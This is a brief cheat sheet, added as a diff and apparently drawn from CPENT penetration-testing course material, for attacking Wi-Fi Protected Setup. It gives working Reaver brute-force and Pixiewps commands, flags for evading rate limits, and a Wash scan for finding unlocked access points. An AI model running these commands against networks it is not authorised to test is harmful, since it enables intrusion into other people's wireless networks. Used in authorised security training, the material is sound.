@@ -1,0 +1,23 @@
+# Reaver / Pixiewps — WPS Attack Reference
+# Source: CPENT module wireless
+
+## Basic Reaver WPS brute-force
+reaver -i wlan0mon -b <AP_MAC> -vv
+
+## Pixiewps offline WPS attack (much faster)
+reaver -i wlan0mon -b <AP_MAC> -vv -K 1
+
+## Reaver with timeouts (evasion for rate-limiting APs)
+reaver -i wlan0mon -b <AP_MAC> -d 15 -t 10 -r 3:15 -vv
+
+## Wash — scan for WPS-enabled APs
+wash -i wlan0mon
+# Look for WPS Locked: No targets
+
+## Key flags
+# -K 1  Pixiewps mode
+# -d    Delay between PINs (sec)
+# -t    Timeout per PIN attempt
+# -r    Rate limit (attempts:seconds)
+# -p    Start from specific PIN
+# --no-associate  Handle association manually with aireplay-ng
